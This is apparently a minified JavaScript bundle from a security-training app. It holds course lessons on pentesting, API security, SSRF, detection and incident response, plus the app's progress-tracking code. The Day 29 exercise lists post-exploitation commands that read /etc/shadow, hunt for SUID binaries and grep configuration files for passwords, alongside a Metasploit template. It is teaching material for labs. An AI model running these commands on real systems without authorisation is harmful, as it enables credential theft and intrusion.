For each discovered service:
- Search CVE databases for the exact version
- Check Exploit-DB for public PoCs
- Run Burp Suite against web services
- Check for default credentials on admin panels

## Phase 3: Exploitation (60 min)

Select your most promising attack vector. Try the simplest exploitation path first.

\`\`\`bash
# Example: Metasploit module for identified service
use exploit/<module>
set RHOSTS <target>
set LHOST <your_ip>
run
\`\`\`

Document: Exact exploit used, command run, output received.

## Phase 4: Post-Exploitation (30 min)

With initial access:
\`\`\`bash
# Enumerate local privilege escalation
sudo -l
find / -perm -4000 2>/dev/null
uname -a  # Kernel exploits?
cat /etc/crontab

# Enumerate credentials
cat /etc/passwd /etc/shadow
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password"
\`\`\`

## Phase 5: Reporting (15 min)

Write a brief report covering:
1. Executive summary (2-3 sentences)
2. Timeline of the attack
3. Each finding with severity and evidence
4. Remediation recommendations`,labHint:'Recommended labs: TryHackMe "Basic Pentesting" room, VulnHub "Mr. Robot", or HackTheBox "Lame". All are beginner-intermediate and great for practicing a full attack chain.'},{id:"day-30",day:30,week:5,title:"Report Writing & Certification",duration:"90 min",objectives:["Write a professional penetration test report","Communicate technical findings to both technical and executive audiences","Complete the 30-day course and earn your Vindicta Security Certificate"],content:`# Day 30 — Report Writing & Certification

## The Professional Pentest Report

A penetration test report is your deliverable. It must be clear enough for developers to fix issues and compelling enough for executives to fund the fixes.

## Report Structure

**1. Cover Page**: Client name, date, assessor, classification level.

**2. Executive Summary** (1 page):
- What was tested and why
- Overall security posture (1-2 sentences)
- 3-5 key risks in business language (no technical jargon)
- Recommended priority actions

**3. Scope and Methodology**:
- In-scope systems and exclusions
- Test type (black/grey/white box)
- Tools and techniques used
- Testing dates

**4. Risk Rating Matrix**:
Define your severity scale. CVSS-based is standard:
- Critical (9.0-10.0): Immediate action required
- High (7.0-8.9): Address within 30 days
- Medium (4.0-6.9): Address within 90 days
- Low (0.1-3.9): Address in next cycle

**5. Findings** (one section per finding):
- Finding title and severity
- Affected component
- Description and business impact
- Technical evidence (screenshot/request)
- Steps to reproduce
- Remediation guidance
- References (CVE, CWE, OWASP)

**6. Remediation Roadmap**: Prioritised table of all findings with target dates.

**7. Appendices**: Full tool output, raw scan results.

## Writing for Two Audiences

**For the CTO** (executive summary): "An attacker who gains access to the login page can bypass authentication entirely, gaining access to all 47,000 user accounts and their payment data. This is a critical risk requiring immediate remediation."

**For the developer**: "The \`/api/auth/login\` endpoint uses string concatenation to build the SQL query on line 42 of \`auth.service.ts\`. Parameterise the query using \`pg\` prepared statements..."

## You Made It!

Completing this 30-day bootcamp means you've covered the full spectrum: from foundational security mindset through web app exploitation, penetration testing methodology, and defensive engineering.

You are ready to:
- Apply security thinking to every feature you build
- Conduct basic penetration tests on web applications
- Set up DevSecOps pipelines
- Respond to security incidents
- Communicate risk to stakeholders

Continue your journey: pursue OSCP, CEH, or eJPT certifications. Practice on HackTheBox and TryHackMe. Build security tooling. Stay curious.`,labHint:"Write a complete professional report for the red team exercise you conducted on Day 29. Include all sections. Share it with a colleague for feedback on clarity."},{id:"day-31",day:31,week:6,title:"API Security Deep Dive",duration:"75 min",objectives:["Model common API abuse paths beyond basic input validation","Identify authorization flaws across object, function, and property access","Build an API test checklist that fits real engineering workflows"],content:`# Day 31 - API Security Deep Dive

## Why APIs Fail Differently

APIs are not just web forms without HTML. They expose business objects, state transitions, identities, and trust boundaries directly to clients. That means the most damaging issues are often logic and authorization flaws.

## The Three Authorization Checks

**Object access**: Can this user access this invoice, project, tenant, or ticket?

**Function access**: Can this user perform this action at all?

**Property access**: Can this user read or update this field?

## API Testing Loop

1. Collect endpoints from the app, OpenAPI specs, traffic, and frontend code.
2. Group endpoints by resource and action.
3. Test each endpoint with another user's object IDs.
4. Test lower-privilege tokens against privileged functions.
5. Remove fields, add unexpected fields, and change types.
6. Watch server responses for hidden behavior and excessive data.

## Reporting API Risk

Good API findings explain the business object, the trust boundary, the broken rule, and the impact. Screenshots matter less than request and response evidence.`,labHint:"Choose one API in a project you own. Create a table of endpoints, roles, required object ownership, and the exact request you would use to test the control."},{id:"day-32",day:32,week:6,title:"Authentication & Session Hardening",duration:"80 min",objectives:["Review login, recovery, MFA, and session lifecycle risks","Design secure session expiry and token rotation behavior","Recognize dangerous convenience features in auth flows"],content:`# Day 32 - Authentication & Session Hardening

## Authentication Is a System

Login is only one piece. A real authentication system includes enrollment, password changes, account recovery, MFA, session creation, session renewal, device trust, logout, and audit logging.

## Session Checklist

- Cookies use HttpOnly, Secure, and SameSite attributes.
- Sessions rotate after login and privilege changes.
- Long-lived tokens are revocable.
- Logout invalidates server-side state.
- Password reset links are short-lived, single-use, and audited.
- MFA bypass paths are treated as high-risk code.

## Common Failures

**Password reset takeover** happens when reset tokens leak, do not expire, or can be reused.

**Session fixation** happens when an attacker controls a session identifier before the victim logs in.

**MFA confusion** happens when the app verifies that MFA exists but not that it was successfully completed for this login.`,labHint:"Review an app you control and write a lifecycle diagram for one session from login to logout. Mark every point where the session should rotate or expire."},{id:"day-33",day:33,week:6,title:"SSRF & Cloud Metadata",duration:"75 min",objectives:["Understand how server-side request forgery reaches internal systems","Recognize cloud metadata and internal admin targets","Design layered SSRF defenses"],content:`# Day 33 - SSRF & Cloud Metadata

## The Core Idea

Server-side request forgery lets an attacker make your server send a request. The attacker may not be able to reach internal services directly, but your server can.

## High-Value Targets

- Cloud metadata services
- Internal admin panels
- Localhost-only APIs
- Redis, Elasticsearch, and dashboards
- Webhooks that can call private networks

## Defensive Layers

1. Prefer allowlists of known hosts.
2. Resolve DNS and validate the final IP address.
3. Block private, loopback, link-local, and metadata IP ranges.
4. Use network egress controls.
5. Limit redirects and re-check each redirect target.
6. Avoid returning raw response bodies to users.

## The Cloud Metadata Trap

Many cloud platforms expose instance credentials through metadata endpoints. Modern platforms add protections, but applications should still treat metadata access as a critical boundary.`,labHint:"Write a safe URL validation checklist for a webhook feature. Include DNS resolution, redirect handling, private IP blocking, and logging."},{id:"day-34",day:34,week:6,title:"Deserialization & Supply Chain",duration:"90 min",objectives:["Explain why unsafe deserialization can become code execution","Map dependency trust in build and runtime environments","Create a supply-chain review checklist"],content:`# Day 34 - Deserialization & Supply Chain

## Deserialization Risk

Deserialization turns stored or transmitted data back into objects. If a runtime can execute code during that process, attacker-controlled data may become attacker-controlled behavior.

## Safer Patterns

- Use simple data formats for untrusted input.
- Avoid restoring full object graphs from user-controlled data.
- Sign and validate serialized blobs that must cross trust boundaries.
- Keep dangerous gadget-heavy libraries away from exposed parsers.

## Supply Chain Thinking

Dependencies are code you did not write but still ship. Review package names, maintainers, install scripts, lockfile changes, transitive dependencies, and release history.

## Practical Review Questions

- Did this dependency add postinstall scripts?
- Does it execute network calls during build?
- Is the package name visually similar to a popular one?
- Does the update change a security-sensitive code path?`,labHint:"Inspect one recent dependency update in a project. Note maintainer, install scripts, transitive additions, and whether the package runs during build or runtime."},{id:"day-35",day:35,week:6,title:"Secure Code Review Workshop",duration:"2 hours",objectives:["Perform a focused secure code review from sources to sinks","Turn review notes into concrete findings","Practice prioritizing code issues by exploitability"],content:`# Day 35 - Secure Code Review Workshop

## Review Strategy

Start with threat-shaped questions instead of reading every file equally.

**Entry points**: routes, controllers, commands, jobs, webhooks, file uploads.

**Trust boundaries**: user input, third-party events, admin actions, tenant boundaries.

**Dangerous sinks**: database queries, template rendering, shell execution, file paths, redirects, crypto, and authorization checks.

## A Practical Review Pass

1. Pick one feature.
2. Trace input from request to storage or action.
3. Mark every validation and authorization decision.
4. Identify the first dangerous sink.
5. Write a reproduction plan before writing the finding.

## Prioritization

The strongest findings combine attacker control, weak validation, a reachable sink, and meaningful impact.`,labHint:"Pick one route or controller in a project. Trace one input to its final sink and write a short finding or a short note explaining why it is safe."},{id:"day-36",day:36,week:7,title:"Endpoint Telemetry",duration:"70 min",objectives:["Identify useful endpoint signals for security monitoring","Distinguish high-signal telemetry from noisy logs","Plan lightweight endpoint visibility for small teams"],content:`# Day 36 - Endpoint Telemetry

## What Endpoint Telemetry Answers

Endpoint telemetry helps answer what ran, who ran it, what it touched, and where it connected.

## Useful Signals

- Process creation with command line
- Parent and child process relationships
- Network connections
- File writes in sensitive paths
- Persistence changes
- Authentication events
- Script interpreter usage

## Signal Quality

More logs are not automatically better. Good telemetry is complete enough for investigation, structured enough for detection, and cheap enough to keep.`,labHint:"Design an endpoint logging policy for one workstation or server. List five events you would collect and one detection each event enables."},{id:"day-37",day:37,week:7,title:"Detection Engineering",duration:"90 min",objectives:["Write detections from attacker behavior instead of tool names","Map detections to data sources and expected false positives","Create a simple detection test plan"],content:`# Day 37 - Detection Engineering

## Detection Is an Engineering Discipline

A detection is a small product. It has inputs, logic, outputs, owners, tests, tuning, and maintenance.

## Detection Template

- Behavior: what attacker action are we trying to catch?
- Data source: which logs prove it happened?
- Logic: what pattern identifies it?
- False positives: what legitimate behavior looks similar?
- Response: what should the analyst do next?
- Test: how do we safely trigger it?

## Behavior Over Tool Names

Tools change names. Behaviors persist. Detect suspicious PowerShell download patterns, not just a single offensive framework string.`,labHint:"Write one detection idea for suspicious shell activity. Include behavior, data source, logic, false positives, response, and test."},{id:"day-38",day:38,week:7,title:"Threat Hunting",duration:"80 min",objectives:["Turn a security hypothesis into a hunt","Use scoping and pivots to avoid endless searching","Document hunt outcomes even when no incident is found"],content:`# Day 38 - Threat Hunting

## Start With a Hypothesis

Threat hunting is not wandering through logs. A hunt starts with a testable idea:

"If an attacker gained persistence through scheduled tasks, we should see unusual task creation followed by unexpected process execution."

## Hunt Flow

1. State the hypothesis.
2. Define data sources.
3. Query broad enough to catch variants.
4. Pivot on rare users, hosts, paths, and parent processes.
5. Record benign explanations and tuning ideas.

## Good Outcomes

No incident found can still be a win if you improve visibility, tune a detection, or discover a gap before an attacker does.`,labHint:"Write a hunt hypothesis for persistence, credential access, or data staging. Define the first query and two pivots."},{id:"day-39",day:39,week:7,title:"Incident Command Tabletop",duration:"95 min",objectives:["Coordinate roles during a security incident","Separate technical investigation from communications","Practice decision-making under incomplete information"],content:`# Day 39 - Incident Command Tabletop

## Why Tabletop Exercises Work

Incidents are stressful because information is partial, timelines are messy, and business pressure is real. A tabletop lets a team practice decisions before the pressure arrives.

## Core Roles

- Incident commander: owns coordination and priorities.
- Technical lead: owns investigation and containment options.
- Communications lead: owns stakeholder updates.
- Scribe: owns timeline and evidence.

## Tabletop Scenario

Your monitoring reports unusual outbound traffic from a production server. A developer says they deployed a new integration yesterday. The CFO asks whether customer data is exposed.

## Decisions to Practice

What do you isolate? Who approves downtime? What evidence must be preserved? When do you notify leadership? What do you say before you know the full answer?`,labHint:"Run a 20-minute tabletop with yourself or a teammate. Write a timeline, three decisions made, and two follow-up improvements."},{id:"day-40",day:40,week:7,title:"Security Portfolio & Next Steps",duration:"70 min",objectives:["Package your Academy work into a security portfolio","Choose a focused next specialization path","Define a maintenance habit for continued growth"],content:`# Day 40 - Security Portfolio & Next Steps

## Turn Practice Into Evidence

A security portfolio shows how you think. It can include sanitized reports, threat models, detection ideas, secure code review notes, lab writeups, dashboards, and tooling scripts.

## Portfolio Checklist

- One web app finding with evidence and remediation.
- One threat model diagram or table.
- One detection rule with test notes.
- One incident tabletop summary.
- One secure code review note.
- One short reflection on what you would improve next.

## Choose Your Next Path

**Red team**: exploit development, Active Directory, web exploitation, OSCP-style labs.

**Blue team**: SIEM, endpoint detection, incident response, cloud security, forensics.

**Product security**: threat modeling, secure design reviews, code review, platform security.

## Keep the Habit

Security skill compounds through repetition. Schedule one small practice loop each week: read one advisory, review one code path, test one detection, or write one finding.`,labHint:"Create a portfolio outline with five artifacts from this Academy. Add one next action for red team, blue team, and product security."}],G=T.filter(i=>!A.includes(i.id)).length;function X(i){return T.find(n=>n.id===i)}function K(i){return g.find(n=>n.number===i)??g[g.length-1]}const _="vindicta-academy.bin",S="academy-state";async function k(){const{Store:i}=await B(async()=>{const{Store:n}=await import("./CG_1pvN7.js");return{Store:n}},__vite__mapDeps([0,1,2]),import.meta.url);return i.load(_)}const f=G,J=V("academy",()=>{const i=o(null),n=o(null),c=o(null),a=o({}),s=o({}),l=o(null),d=o(null),u=o(null),p=o(!1),b=o(!1),v=new Set(A),m=y(()=>Object.entries(a.value).filter(([e,t])=>!v.has(e)&&t.completedAt!==null).length),x=y(()=>m.value>=f),C=y(()=>Math.round(m.value/f*100));function P(e){return!!a.value[e]?.completedAt}function D(e){return!!a.value[e]?.startedAt}function I(e){return w(e)}async function r(){try{const e=await k();await e.set(S,{mode:i.value,aiModel:n.value,certificateName:c.value,completedLessons:a.value,chatSessions:s.value,certificateIssuedAt:l.value,lastVisitedModuleId:d.value,lastVisitedLessonId:u.value,setupComplete:p.value}),await e.save()}catch(e){console.warn("[Academy] Save failed:",e)}}async function R(){if(!b.value)try{const t=await(await k()).get(S);t&&(i.value=t.mode??null,n.value=t.aiModel??null,c.value=t.certificateName??null,a.value=t.completedLessons??{},s.value=t.chatSessions??{},l.value=t.certificateIssuedAt??null,d.value=t.lastVisitedModuleId??null,u.value=t.lastVisitedLessonId??null,p.value=t.setupComplete??!1)}catch(e){console.warn("[Academy] Load failed:",e)}finally{b.value=!0}}async function E(e,t,h){i.value=e,n.value=t,h!==void 0&&(c.value=h?.trim()||null),p.value=!0,await r()}async function L(){i.value=null,n.value=null,c.value=null,p.value=!1,a.value={},s.value={},l.value=null,d.value=null,u.value=null,await r()}async function M(e=!0){a.value={},s.value={},l.value=null,d.value=null,u.value=null,e||(i.value=null,n.value=null,c.value=null,p.value=!1),await r()}async function H(e){c.value=e?.trim()||null,await r()}function O(e){return s.value[e]??[]}async function W(e,t){s.value={...s.value,[e]:t},await r()}async function F(e){const t={...s.value};delete t[e],s.value=t,await r()}async function j(e){a.value[e]||(a.value={...a.value,[e]:{completedAt:null,startedAt:new Date().toISOString()}},await r())}async function w(e){const t=a.value[e],h={...a.value,[e]:{startedAt:t?.startedAt??new Date().toISOString(),completedAt:new Date().toISOString()}};a.value=h,Object.entries(h).filter(([q,U])=>!v.has(q)&&U.completedAt!==null).length>=f&&!l.value&&(l.value=new Date().toISOString()),await r()}async function N(e,t){d.value=e,u.value=t,await r()}return{mode:i,aiModel:n,certificateName:c,completedLessons:a,chatSessions:s,certificateIssuedAt:l,lastVisitedModuleId:d,lastVisitedLessonId:u,setupComplete:p,completedCount:m,allCompleted:x,progressPercent:C,isCompleted:P,isStarted:D,grantLessonCompletion:I,loadFromDisk:R,setSetup:E,setCertificateName:H,resetSetup:L,resetProgress:M,startLesson:j,completeLesson:w,setLastVisited:N,getChatSession:O,setChatSession:W,clearChatSession:F}});export{T as L,Q as T,g as W,K as a,X as g,J as u};
